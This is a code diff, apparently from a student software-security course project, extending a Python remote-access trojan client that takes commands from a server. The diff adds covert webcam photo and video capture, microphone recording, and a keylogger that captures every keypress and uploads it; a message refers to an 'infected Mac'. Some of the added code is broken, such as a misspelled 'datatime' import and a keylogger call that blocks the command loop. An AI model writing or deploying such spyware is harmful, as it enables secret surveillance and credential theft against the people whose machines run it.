@@ -1,5 +1,6 @@
 # coding: gb18030
 
+import datetime
 import time
 import os
 import subprocess
@@ -15,7 +16,11 @@ import zipfile
 import tempfile
 import socket
 import getpass
+import pyaudio
+import wave
 
+from datetime import datatime
+from pynput.keyboard import Key, Listener
 import cv2
 
 if os.name == 'nt':
@@ -33,6 +38,8 @@ class Client(object):
         # self.uid = self.get_UID()
         self.hostname = socket.gethostname()
         # print({'platform': self.platform, 'hostname': self.hostname})
+        self.keylogs = ""
+        # keylogs是用于存储键盘记录的字符串
 
     def server_hello(self):
         """ Ask server for instructions """
@@ -118,11 +125,11 @@ class Client(object):
         self.upload(screenshot_file)
 
 
-    def camshot(self):
-        # Notice: light of usage webcam gets turned on.
-        # TODO: Find way to disable led-lamp or reduce amount of time.sleep as much as possible for less detection
+    def camerashot(self):
+        """开启客户端主机的摄像头,3秒后拍摄一张图片，再upload"""
         cam = cv2.VideoCapture(0)
-        time.sleep(3)  # wait for camera to open up, so image isn't dark (less sleeping = darker image)
+        time.sleep(3)  # wait for camera to open up, 
+                       # so image isn't dark (less sleeping = darker image)
         ret, frame = cam.read()
         if not ret:
             return
@@ -132,7 +139,99 @@ class Client(object):
         cv2.imwrite(camshot_file, frame)
         self.upload(camshot_file)
 
+    def cameravideo(self):
+        cap = cv2.VideoCapture(0)# 打开摄像头
+        width = 1920
+        height = 1080
+        # Define the codec and create VideoWriter object
+        # fourcc为四个字符用来表示压缩帧的codec
+        fourcc = cv2.VideoWriter_fourcc(*'XVID')
+        tmp_file = tempfile.NamedTemporaryFile()
+        cameravideo_file = tmp_file.name + ".avi"
+        out = cv2.VideoWriter(cameravideo_file, fourcc, 20.0, (width, height))
+        print("Video recording...")
+        start_time = datetime.now()
+        while cap.isOpened():
+            ret, frame = cap.read()
+            if ret is True:
+                if (datetime.now()-start_time).seconds == 5:#录制5秒结束
+                    break
+                frame = cv2.resize(frame, (1920, 1080))
+                # write the flipped frame
+                out.write(frame)
+            else:
+                break
+            key = cv2.waitKey(1)
+            if key == ord("q"):
+                break
+        # Release everything if job is finished
+        cap.release()
+        out.release()
+        cv2.destroyAllWindows()
+        print("Video created...")
+        self.upload(cameravideo_file)
+
+    def audiocatch(self):
+        """开启客户端主机麦克风,录制 10 秒音频,保存为output.wav,再upload"""
+        chunk = 1024 # Record in chunks of 1024 samples 数据流块
+        sample_format = pyaudio.paInt16 # 16 bits per sample 量化位数
+        channels = 2 # 声道数：双声道
+        fs = 44100 # 一秒钟内对声音信号的采集次数 采样率
+        seconds = 10 # 录制秒数 这里录制 10 秒
+        tmp_file = tempfile.NamedTemporaryFile()
+        audiocatch_file = tmp_file.name + ".wav"
+        audioFilename = audiocatch_file
+        p = pyaudio.PyAudio() # 实例化
+        print('Recording...')
+        
+        stream = p.open(format=sample_format,
+            channels=channels,
+            rate=fs,
+            frames_per_buffer=chunk,
+            input=True)
+        frames = [] # 列表用于存储 frames
+        # Store data in chunks for 10 seconds
+        for i in range(0, int(fs / chunk * seconds)):
+            data = stream.read(chunk) # 读取chunk个字节，放在data中
+            frames.append(data)       # 列表添加中 添加 data
+        # Stop and close the stream 
+        stream.stop_stream()
+        stream.close()
+        # Terminate the PortAudio interface
+        p.terminate()
+        
+        print('Finished recording...')
+        # Save the recorded data as a WAV file
+        wf = wave.open(audioFilename, 'wb')
+        # 依次配置相关参数
+        wf.setnchannels(channels)
+        wf.setsampwidth(p.get_sample_size(sample_format))
+        wf.setframerate(fs)
+        wf.writeframes(b''.join(frames))# 转化为二进制写入文件
+        wf.close()
+        
+        self.upload(audioFilename)
+
+    def startkeylogger(self):
+        "Starts logging every key pressed"
+        def on_press(key):
+            self.keylogs += str(key) + " "
+
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+
+    def getloggedkeys(self):
+        self.send_output(self.keylogs)
+        self.keylogs = ""
+        if platform.system() == "Darwin":
+            self.send_output("Keylogger on infected Mac currenly not supported")
+
+
     def run(self):
+        try:
+            self.startkeylogger() # 开始记录每一个键盘press的记录
+        except:
+            print("startKeylogger failed")
         """ Main loop """
         while True:
             try:
@@ -156,7 +255,13 @@ class Client(object):
                     elif command == 'screenshot':
                         self.screenshot()
                     elif command == 'camshot':
-                        self.camshot()
+                        self.camerashot()
+                    elif command == 'cameravideo':
+                        self.cameravideo()
+                    elif command == 'audiocatch':
+                        self.audiocatch()
+                    elif command == 'keylogger':
+                        self.getloggedkeys()
                     else:
                         self.runcmd(commandline)
                     f = open('F:\\current_semester\\software_security\\shell\\remote-shell\\G11RC\\test.txt', 'w+')
@@ -170,6 +275,10 @@ class Client(object):
         req = requests.post(config.SERVER + '/test/',
                             json={'name': 'lzl', 'number':'0017'})
         return req
+
+
+
+
 
 def main():
     agent = Client()
